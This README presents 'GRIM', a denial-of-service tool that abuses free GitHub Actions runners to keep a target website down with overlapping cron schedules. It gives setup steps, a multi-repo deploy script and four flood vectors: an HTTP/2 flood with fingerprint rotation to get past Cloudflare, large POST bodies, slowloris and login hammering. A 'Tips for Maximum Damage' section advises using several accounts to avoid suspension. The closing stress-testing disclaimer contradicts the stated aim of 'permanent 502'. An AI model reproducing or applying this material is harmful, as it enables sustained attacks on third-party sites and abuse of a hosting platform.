# GRIM — GitHub Actions Super Weapon

**PERMANENT 502. Zero recovery. Infinite fire.**

---

## How It Works

GitHub Actions provides **free, unlimited compute** on Microsoft's Azure infrastructure. Each workflow run spins up **8 parallel runners**, each runner fires GRIM with **4 vectors × 50 workers = 200 concurrent connections**. Multiple repos = multiplied IPs = CF can't block all of Microsoft.

### Why This Is Near-Impossible to Stop

| Factor | Impact |
|--------|--------|
| 8 runners × 4 vectors × 50 workers | 16,000 concurrent connections per repo |
| Azure IPs (Microsoft's datacenter ranges) | CF can't ban all of Microsoft's IP space |
| Multiple repos | You'd have to ban every repo separately |
| Overlapping 4h schedules | No recovery window — attack restarts before previous run ends |
| 5.5h max run × 4h trigger interval | Seamless relay, always-on |
| 3 cron schedules per repo | 3 overlapping waves per repo |

### With 3 Repos (Recommended)

- Repo 1: cron `0 */4 * * *` + `0 */2 * * *`
- Repo 2: cron `30 */4 * * *`
- Repo 3: cron `15 */3 * * *`

= **24 simultaneous Azure IPs, continuous fire, zero downtime**

---

## Setup (5 Minutes)

### Step 1: Create ONE Public Repo

```
Name: grim-siege (or anything public)
Visibility: Public (free minutes are unlimited on public repos)
```

### Step 2: Upload These Files

```
.github/workflows/grim.yml   ← the workflow
runner.py                   ← the attack script
```

### Step 3: Set Target

Edit `grim.yml` workflow dispatch default:
```yaml
workflow_dispatch:
  inputs:
    target:
      description: 'Target URL'
      required: true
      default: 'https://YOUR-TARGET.HERE'   ← CHANGE THIS
```

Or set it at runtime via the GitHub Actions web UI.

### Step 4: Fire

1. Go to **Actions** tab
2. Select **GRIM-SIEGE**
3. Click **Run workflow**
4. Enter target URL + workers (default 50)
5. Click **Run workflow**

### Step 5: Multiply (Recommended)

Run `deploy-grim.sh` multiple times with different repo names, or manually create more public repos with the same files. More repos = more Azure IPs = more firepower.

---

## Repo Architecture

```
grim-gh/
├── .github/
│   └── workflows/
│       └── grim.yml          # 8-runner matrix, 3 cron schedules
├── runner.py                 # The siege script (runs on each runner)
└── README.md
```

## Cron Schedule (Per Repo)

```yaml
schedule:
  - cron: '0 */4 * * *'    # Every 4h on the hour
  - cron: '30 */4 * * *'   # Every 4h at :30
  - cron: '0 */2 * * *'    # Every 2h (extra overlap)
```

Runners timeout at 330min (5.5h). Since triggers are every 4h/2h, there's always a running instance when the previous one ends.

## Per-Runner Firepower

```
Runner #N:
  h2_flood    → 50 workers  (HTTP/2 GET flood, JA3 rotation)
  post_bomb   → 50 workers  (256KB POST bodies)
  slowloris   → 50 workers  (slow header trickle)
  auth_grind  → 50 workers  (login endpoint hammering)
─────────────────────────────────────────────────
Total per runner: 200 concurrent connections
Total per repo:   8 × 200 = 1,600 concurrent connections
```

## Vectors Explained

| Vector | What It Does |
|--------|-------------|
| **h2_flood** | HTTP/2 GET flood with TLS fingerprint rotation (Chrome JA3). Bypasses CF's browser detection. |
| **post_bomb** | 256KB POST bodies per request. Exhausts server memory + CPU. |
| **slowloris** | Holds connections open with slow header trickle. Exhausts connection pool. |
| **auth_grind** | Hammers `/login` POST. Triggers Argon2/bcrypt computation per hit. |

## Deploy Script

```bash
./deploy-grim.sh <github-token> <repo-name> <target-url> [workers]

# Example: Deploy 3 repos
./deploy-grim.sh ghp_xxxxx grim-siege-1 https://target.com 50
./deploy-grim.sh ghp_xxxxx grim-siege-2 https://target.com 50
./deploy-grim.sh ghp_xxxxx grim-siege-3 https://target.com 50
```

Then trigger each one via the Actions web UI.

## Tips for Maximum Damage

1. **Deploy 3-5 repos** — more repos = more IPs = more firepower
2. **Use different GitHub accounts** — harder to mass-suspend
3. **Target the login/catalog/search endpoints** — those hit the database
4. **If the server goes down**: it's because the app itself is overwhelmed, not CF
5. **For truly permanent down**: you'd need enough concurrent connections to saturate their actual bandwidth

## Warning

This is a stress testing tool. Use only on servers you own or have explicit written permission to test. Running this against targets without permission is illegal and unethical. The authors assume no liability.
